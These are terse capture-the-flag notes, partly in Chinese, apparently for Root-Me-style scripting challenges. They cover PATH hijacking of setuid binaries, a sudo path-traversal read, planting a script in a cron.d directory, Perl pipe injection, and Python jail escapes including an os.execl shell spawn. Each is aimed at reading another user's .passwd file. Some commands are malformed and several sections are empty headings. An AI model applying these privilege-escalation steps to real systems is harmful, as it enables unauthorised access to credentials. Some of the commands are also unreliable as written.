# 1.Bash - System 1
````bash
cd tmp
mkdir tmp1
cd tmp1
export PATH /tmp/tmp1:${PATH}	Export PATH /tmp/tmp1:PATH
ln -s /bin/cat 
ls
~/ch11
````
---
# 2.sudo - weak configuration 
````bash 
sudo -l
password app-script-ch1
````

matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

user app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
````
sudo -u app-script-ch1-cracked 
cat /challenge/app-script/ch1/notes/../ch1craked/.passwd
````
---
# 3.Bash - System 2
与第一题方式相同
````bash
cp /bin/nano /tmp/tmp1/ls
````
另一种方式：
````bash
nano ls.c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char  *argv[]){
       system("cat /challenge/app-script/ch12/.passwd");
       return 0;
}
gcc ls.c -o ls
export PATH=/tmp/pwnd1:$PATH
~/ch12
````
第三种方式：
````bash
nano ls
cat $2
chmod +x ./ls
export PATH=/tmp/pwnd1:$PATH
~/ch12
````
---
# 4.Perl - Command injection
````bash
./setuid-wrapper
|cat .passwd
````
---
# 5.Bash - cron
脚本注释表明，根据crontab规则，运行app-script-ch4的用户每分钟运行一次。
除其他事项外，该脚本将执行文件夹cron.d /中指示的具有app-script-ch4-cracked权限的命令。
````bash
app-script-ch4@challenge02:~$ cat ch4 
#!/bin/bash
# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4  //app-script-ch4-cracked该用户下的任务计划为每分钟执行一次/challenge/app-script/ch4/ch4这个脚本。
# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)
# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)
# hiding stdout/stderr
exec 1>/dev/null 2>&1
wdir="cron.d/"
challdir=${0%/*}
cd "$challdir"
if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi
ls -1a "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"  //timelimit这个命令不是很懂，但大概意思是固定的时间间隔内执行bash -p cron.d/某个脚本
    fi
    rm -f "${PWD}/${wdir}${task}"  
done
````
````bash
rm -rf cron.d/*   //每隔一分钟清理下该目录下的文件，本题解题时，
需要在该目录创建脚本，有可能我没有完成相关操作，这个脚本就会被删除，需要在一分钟之内完成接题。
set | grep /dev/pts                            //查看当前ssh连接使用的终端号
chmod o+w /dev/pts/n                    //将当前终端的写权限赋予其他用户，即app-script-ch4-cracked
vim cron.d/script.sh                         //写入任务计划
#!/bin/bash
/bin/cat /challenge/app-script/ch4/.passwd > /dev/pts/n
chmod o+rx cron.d/script.sh           //将该脚本的权限设置为其他用户可以读取和运行，因为该脚本需要在app-script-ch4-cracked用户的任务计划中执行，创建脚本后可能被瞬间删除，那样就需要重新创建，执行这两步操作后，等待不超过一分钟就可以生成/tmp/ch4/result.txt包含密码的结果。
````
---
# 6.Python - input()
````python
__import__("os").execl("/bin/sh","sh")
sys.stdout.write(open(".passwd").readline())  
```` 
---
# 7.Python - pickle
https://www.cnblogs.com/heycomputer/articles/10613850.html

---

# 8.SSH - Agent Hijacking
https://www.cnblogs.com/heycomputer/articles/10617379.html

---
# 9.Python - PyJail 1
````python
print(exit.func_code.co_consts)
````
````
28.13.1. Types and members
The getmembers() function retrieves the members of an object such as a class or module. The sixteen functions whose names begin with “is” are mainly provided as convenient choices for the second argument to getmembers(). They also help you determine when you can expect to find the following special attributes:
Type	Attribute	Description
module	__doc__	documentation string
 	__file__	filename (missing for built-in modules)
class	__doc__	documentation string
 	__module__	name of module in which this class was defined
method	__doc__	documentation string
 	__name__	name with which this method was defined
 	im_class	class object that asked for this method
 	im_func or __func__	function object containing implementation of method
 	im_self or __self__	instance to which this method is bound, or None
function	__doc__	documentation string
 	__name__	name with which this function was defined
 	func_code	code object containing compiled function bytecode
 	func_defaults	tuple of any default values for arguments
 	func_doc	(same as __doc__)
 	func_globals	global namespace in which this function was defined
 	func_name	(same as __name__)
generator	__iter__	defined to support iteration over container
 	close	raises new GeneratorExit exception inside the generator to terminate the iteration
 	gi_code	code object
 	gi_frame	frame object or possibly None once the generator has been exhausted
 	gi_running	set to 1 when generator is executing, 0 otherwise
 	next	return the next item from the container
 	send	resumes the generator and “sends” a value that becomes the result of the current yield-expression
 	throw	used to raise an exception inside the generator
traceback	tb_frame	frame object at this level
 	tb_lasti	index of last attempted instruction in bytecode
 	tb_lineno	current line number in Python source code
 	tb_next	next inner traceback object (called by this level)
frame	f_back	next outer frame object (this frame’s caller)
 	f_builtins	builtins namespace seen by this frame
 	f_code	code object being executed in this frame
 	f_exc_traceback	traceback if raised in this frame, or None
 	f_exc_type	exception type if raised in this frame, or None
 	f_exc_value	exception value if raised in this frame, or None
 	f_globals	global namespace seen by this frame
 	f_lasti	index of last attempted instruction in bytecode
 	f_lineno	current line number in Python source code
 	f_locals	local namespace seen by this frame
 	f_restricted	0 or 1 if frame is in restricted execution mode
 	f_trace	tracing function for this frame, or None
code	co_argcount	number of arguments (not including * or ** args)
 	co_code	string of raw compiled bytecode
 	co_consts	tuple of constants used in the bytecode
 	co_filename	name of file in which this code object was created
 	co_firstlineno	number of first line in Python source code
 	co_flags	bitmap: 1=optimized | 2=newlocals | 4=*arg | 8=**arg
 	co_lnotab	encoded mapping of line numbers to bytecode indices
 	co_name	name with which this code object was defined
 	co_names	tuple of names of local variables
 	co_nlocals	number of local variables
 	co_stacksize	virtual machine stack space required
 	co_varnames	tuple of names of arguments and local variables
builtin	__doc__	documentation string
 	__name__	original name of this function or method
 	__self__	instance to which a method is bound, or None
````
---
# 10.Bash/Awk - netstat parsing
---
# 11.PHP - Jail
---
# 12.Python - PyJail 2
````python
print dir(getout)
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name'] 

print getattr(getout,dir(getout)[-2])
 {'execute': <function execute at 0xb7bc2454>, 'random': <built-in method random of Random object at 0x7c8f4c>, '__builtins__': <module '__builtin__' (built-in)>, '__file__': '/challenge/app-script/ch9/ch9.py', 'cmd': <module 'cmd' from '/usr/lib/python2.7/cmd.pyc'>, '__package__': None, 'sys': <module 'sys' (built-in)>, 'passwd': 'a26bd5a74fdf0a512f227a2782cd4196', 'intro': '                     __     _ __\n       ___  __ ____ / /__ _(_) /\tWelcome on PyJail2\n      / _ \\/ // / // / _ `/ / / \n     / .__/\\_, /\\___/\\_,_/_/_/  \tUse getout() function if you want to\n    /_/   /___/                 \tescape from here and get the flag !\n', 'Jail': <class __main__.Jail at 0xb7bb3f5c>, '__name__': '__main__', 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, '__doc__': None, 'md5': <built-in function openssl_md5>} 

print list(getattr(getout,dir(getout)[-2]))
['execute', 'random', '__builtins__', '__file__', 'cmd', '__package__', 'sys', 'passwd', 'intro', 'Jail', '__name__', 'os', '__doc__', 'md5'] 

print list(getattr(getout,dir(getout)[-2]))[-7] 

 passwd 

print getout(getattr(getout,dir(getout)[-2])[list(getattr(getout,dir(getout)[-2]))[-7]])
````
---
# 13.Python - Jail - Exec
---
# 14.Javascript - Jail
---
# 15.Python - Jail - Garbage collector
---
# 16.Bash - Restricted shells
---



	
